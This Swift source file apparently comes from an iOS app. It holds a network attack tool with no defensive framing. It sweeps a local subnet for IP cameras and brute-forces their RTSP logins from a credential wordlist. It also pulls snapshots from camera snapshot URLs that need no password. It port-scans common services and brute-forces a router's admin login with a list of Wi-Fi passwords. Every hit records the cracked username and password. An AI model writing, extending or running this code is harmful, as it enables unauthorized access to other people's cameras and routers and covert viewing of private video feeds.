import Foundation
import Network
import UIKit

final class NetworkTool: ObservableObject {
    @Published var logs = ""
    @Published var isScanning = false
    @Published var progress: Double = 0
    @Published var hits: [CameraHit] = []
    @Published var lastSnapshot: UIImage? = nil
    @Published var lastSnapshotIP: String = ""
    @Published var loadedCreds: Int = 0
    @Published var loadedWifi: Int = 0

    private var credentials: [Credential] = []
    private var wifiPasswords: [String] = []

    init() {
        credentials = Wordlist.loadCreds()
        wifiPasswords = Wordlist.load("wifi_passwords")
        loadedCreds = credentials.count
        loadedWifi = wifiPasswords.count
        log("[*] creds=\(loadedCreds) wifi=\(loadedWifi)")
    }

    func log(_ t: String) { DispatchQueue.main.async { self.logs += t + "\n" } }
    func clear() { logs = ""; hits = []; lastSnapshot = nil }

    func startCameraScan(subnet: String) {
        isScanning = true; clear()
        Task {
            for i in 1...254 {
                let ip = "\(subnet).\(i)"
                if await checkPort(host: ip, port: 554) {
                    log("[+] \(ip):554")
                    await bruteRTSP(ip: ip)
                } else if await checkPort(host: ip, port: 80) {
                    await trySnapshotNoAuth(ip: ip)
                }
                DispatchQueue.main.async { self.progress = Double(i) / 254.0 }
                try? await Task.sleep(nanoseconds: 120_000_000)
            }
            DispatchQueue.main.async { self.isScanning = false; self.progress = 0; self.log("[*] scan done") }
        }
    }

    func startPortScan(ip: String) {
        isScanning = true; clear()
        let ports: [UInt16] = [21,22,23,25,53,80,110,135,139,143,443,445,554,1433,1521,3306,3389,5432,5900,6379,8080,8443,8554,8888,9100]
        Task {
            var idx = 0
            for p in ports {
                if await checkPort(host: ip, port: p) { log("[+] \(ip):\(p)") }
                idx += 1
                DispatchQueue.main.async { self.progress = Double(idx) / Double(ports.count) }
            }
            DispatchQueue.main.async { self.isScanning = false; self.progress = 0; self.log("[*] ports done") }
        }
    }

    func startWifiBrute(gateway: String) {
        isScanning = true; clear()
        Task {
            var idx = 0
            for pass in wifiPasswords {
                if await tryHTTPBasic(ip: gateway, user: "admin", pass: pass) {
                    log("[!!!] WiFi admin:\(pass)")
                    DispatchQueue.main.async { self.hits.append(CameraHit(ip: gateway, user: "admin", pass: pass, rtspURL: "http://\(gateway)")) }
                    try? await Task.sleep(nanoseconds: 300_000_000)
                }
                idx += 1
                DispatchQueue.main.async { self.progress = Double(idx) / Double(self.wifiPasswords.count) }
                try? await Task.sleep(nanoseconds: 150_000_000)
            }
            DispatchQueue.main.async { self.isScanning = false; self.progress = 0; self.log("[*] wifi done") }
        }
    }

    func checkPort(host: String, port: UInt16) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(host), port: .init(rawValue: port)!, using: .tcp)
            var done = false
            conn.stateUpdateHandler = { s in
                if case .ready = s, !done { done = true; cont.resume(returning: true); conn.cancel() }
                else if case .failed = s, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 0.6) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }

    func bruteRTSP(ip: String) async {
        for cred in credentials {
            if await tryRTSP(ip: ip, user: cred.user, pass: cred.pass) {
                let url = "rtsp://\(cred.user):\(cred.pass)@\(ip):554/"
                log("[!!!] RTSP \(cred.user):\(cred.pass) @ \(ip)")
                DispatchQueue.main.async { self.hits.append(CameraHit(ip: ip, user: cred.user, pass: cred.pass, rtspURL: url)) }
                try? await Task.sleep(nanoseconds: 500_000_000)
                return
            }
            try? await Task.sleep(nanoseconds: 120_000_000)
        }
        log("[-] \(ip) no RTSP")
    }

    func tryRTSP(ip: String, user: String, pass: String) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(ip), port: 554, using: .tcp)
            var done = false
            let auth = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
            let req = "DESCRIBE rtsp://\(ip):554/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: DolphyCam\r\nAuthorization: Basic \(auth)\r\n\r\n"
            conn.stateUpdateHandler = { s in
                if case .ready = s {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed { _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 2048) { data, _, _, _ in
                            defer { if !done { done = true; conn.cancel() } }
                            if let d = data, let str = String(data: d, encoding: .utf8), str.contains("200 OK") {
                                cont.resume(returning: true); return
                            }
                            cont.resume(returning: false)
                        }
                    })
                } else if case .failed = s, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.5) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }

    func trySnapshotNoAuth(ip: String) async {
        let paths = ["/snapshot.jpg","/jpg/image.jpg","/image/jpeg.cgi","/cgi-bin/snapshot.cgi","/onvif/snapshot"]
        for path in paths {
            if let img = await fetchImage(ip: ip, path: path, user: nil, pass: nil) {
                log("[+] snapshot \(ip)\(path)")
                DispatchQueue.main.async { self.lastSnapshot = img; self.lastSnapshotIP = ip }
                return
            }
        }
    }

    func fetchImage(ip: String, path: String, user: String?, pass: String?) async -> UIImage? {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(ip), port: 80, using: .tcp)
            var done = false
            var req = "GET \(path) HTTP/1.1\r\nHost: \(ip)\r\nConnection: close\r\n"
            if let u = user, let p = pass {
                req += "Authorization: Basic \("\(u):\(p)".data(using: .utf8)!.base64EncodedString())\r\n"
            }
            req += "\r\n"
            conn.stateUpdateHandler = { s in
                if case .ready = s {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed { _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 262144) { data, _, _, _ in
                            defer { if !done { done = true; conn.cancel() } }
                            if let d = data {
                                if let r = d.range(of: Data("\r\n\r\n".utf8)) {
                                    let body = d.subdata(in: r.upperBound..<d.count)
                                    if let img = UIImage(data: body) { cont.resume(returning: img); return }
                                } else if let img = UIImage(data: d) { cont.resume(returning: img); return }
                            }
                            cont.resume(returning: nil)
                        }
                    })
                } else if case .failed = s, !done { done = true; cont.resume(returning: nil) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 2.0) {
                if !done { done = true; conn.cancel(); cont.resume(returning: nil) }
            }
        }
    }

    func tryHTTPBasic(ip: String, user: String, pass: String) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(ip), port: 80, using: .tcp)
            var done = false
            let auth = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
            let req = "GET / HTTP/1.1\r\nHost: \(ip)\r\nAuthorization: Basic \(auth)\r\nConnection: close\r\n\r\n"
            conn.stateUpdateHandler = { s in
                if case .ready = s {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed { _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 4096) { data, _, _, _ in
                            defer { if !done { done = true; conn.cancel() } }
                            if let d = data, let str = String(data: d, encoding: .utf8), str.contains("200") {
                                cont.resume(returning: true); return
                            }
                            cont.resume(returning: false)
                        }
                    })
                } else if case .failed = s, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.5) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }
}
